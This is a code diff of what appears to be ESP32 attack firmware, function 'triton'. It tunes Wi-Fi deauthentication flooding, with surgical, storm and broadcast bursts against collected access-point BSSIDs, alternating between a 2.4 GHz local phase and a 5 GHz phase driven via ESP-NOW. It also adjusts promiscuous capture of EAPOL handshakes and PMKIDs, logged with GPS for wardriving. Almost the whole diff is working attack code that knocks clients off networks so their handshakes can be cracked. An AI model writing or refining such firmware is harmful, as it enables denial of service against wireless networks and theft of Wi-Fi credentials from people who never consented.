@@ -432,25 +432,21 @@ static void hop_task(void *)
      * rc=257. Instead: 10 s of pure 2.4 work, 10 s of pure 5 GHz
      * C5 work. Promiscuous RX stays on either way so we still
      * capture EAPOL from dual-band clients cascading down to 2.4. */
+    /* 30 s time-slice: 2.4 GHz attack phase (softAP + local deauth
+     * bursts) alternates with 5 GHz phase (C5 commands fire via
+     * ESP-NOW, no local deauth TX). 30 s is long enough for each
+     * mode to actually land captures before switching; 10 s was too
+     * short and the transitions dominated. No c5_begin/stop toggling
+     * — ESP-NOW stays up the whole time, we just gate which TX path
+     * fires based on phase. */
     uint32_t phase_start = millis();
     s_phase_5g = false;
-    /* Start in 2.4 GHz phase → ESP-NOW off so local softAP deauth TX
-     * doesn't compete for WiFi buffers. The HELLO listener pauses
-     * during this phase; peer state is kept. */
-    c5_stop();
 
     while (s_alive) {
         uint32_t ph_now = millis();
-        if (ph_now - phase_start > 10000) {
+        if (ph_now - phase_start > 30000) {
             phase_start = ph_now;
             s_phase_5g = !s_phase_5g;
-            /* Phase transition: bring ESP-NOW up for 5G, down for 2.4.
-             * c5_begin()/c5_stop() are idempotent so even-number
-             * toggles from boot state are safe. */
-            if (s_phase_5g) c5_begin();
-            else            c5_stop();
-            /* Let the WiFi driver settle after mode transitions. */
-            vTaskDelay(pdMS_TO_TICKS(120));
         }
         /* Channel selection per mode. */
         switch (s_mode) {
@@ -487,39 +483,47 @@ static void hop_task(void *)
              * (original proven pattern). During the 5 GHz window we
              * skip this entirely so TX buffers aren't contested with
              * the C5 commands firing below. */
-            if (wifi_silent_ap_begin(s_ch) != ESP_OK) goto skip_burst;
-            if (s_mode == TM_SURGICAL) {
-                int bursts = 8;
-                for (int k = 0; k < bursts && s_alive; ++k) {
-                    int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
-                    s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
-                    delay(5);
-                }
-            } else {
-                uint8_t bssids[BS_N][6];
-                int nb = 0;
-                portENTER_CRITICAL(&s_bs_mux);
-                int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
-                for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
-                nb = cap;
-                portEXIT_CRITICAL(&s_bs_mux);
-
-                int bursts = (s_mode == TM_STORM) ? 6 : 3;
-                for (int i = 0; i < nb && s_alive; ++i) {
-                    for (int k = 0; k < bursts; ++k) {
-                        int sent = wifi_deauth_broadcast(bssids[i], &seq);
+            bool ap_ok = (wifi_silent_ap_begin(s_ch) == ESP_OK);
+            if (ap_ok) {
+                if (s_mode == TM_SURGICAL) {
+                    int bursts = 8;
+                    for (int k = 0; k < bursts && s_alive; ++k) {
+                        int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
                         s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                         delay(5);
                     }
+                } else {
+                    uint8_t bssids[BS_N][6];
+                    int nb = 0;
+                    portENTER_CRITICAL(&s_bs_mux);
+                    int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
+                    for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
+                    nb = cap;
+                    portEXIT_CRITICAL(&s_bs_mux);
+                    int bursts = (s_mode == TM_STORM) ? 6 : 3;
+                    for (int i = 0; i < nb && s_alive; ++i) {
+                        for (int k = 0; k < bursts; ++k) {
+                            int sent = wifi_deauth_broadcast(bssids[i], &seq);
+                            s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
+                            delay(5);
+                        }
+                    }
                 }
+                wifi_silent_ap_end();
+                /* silent_ap_end() disables promisc. Re-arm — but tighten
+                 * the hardware filter so we only see MGMT + DATA.
+                 * Dropping CTRL (ACKs / RTS / CTS) frees enough RX
+                 * buffer budget that concurrent softAP deauth TX +
+                 * ESP-NOW RX no longer hits NO_MEM as hard. */
+                wifi_promiscuous_filter_t f = {
+                    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
+                                   WIFI_PROMIS_FILTER_MASK_DATA
+                };
+                esp_wifi_set_promiscuous_filter(&f);
+                esp_wifi_set_promiscuous(true);
+                esp_wifi_set_promiscuous_rx_cb(cb);
+                esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
             }
-            wifi_silent_ap_end();
-            /* silent_ap_end() disables promisc. Re-arm so the dwell
-             * window catches beacons/EAPOL/PMKID. */
-            esp_wifi_set_promiscuous(true);
-            esp_wifi_set_promiscuous_rx_cb(cb);
-            esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
-            skip_burst: ;
         }
 
         /* Drain any PMKID/handshake captures that the Wi-Fi callback
@@ -857,11 +861,20 @@ void feat_triton(void)
      * emit_hs check sats > 0 before writing a wardrive row. */
     gps_begin();
 
+    /* Tighten promisc filter — drop CTRL (ACK / RTS / CTS) to free
+     * RX buffer budget so the concurrent softAP deauth + ESP-NOW
+     * RX path doesn't keep returning NO_MEM. Software filter in cb()
+     * already ignores CTRL anyway. */
+    wifi_promiscuous_filter_t filter = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
+                       WIFI_PROMIS_FILTER_MASK_DATA
+    };
+    esp_wifi_set_promiscuous_filter(&filter);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(cb);
     esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
 
-    xTaskCreate(hop_task, "triton", 3072, nullptr, 4, nullptr);
+    xTaskCreate(hop_task, "triton", 4096, nullptr, 4, nullptr);
 
     /* If a C5 is online, kick off a parallel 5 GHz scan so we have
      * targets to deauth on the upper band. */
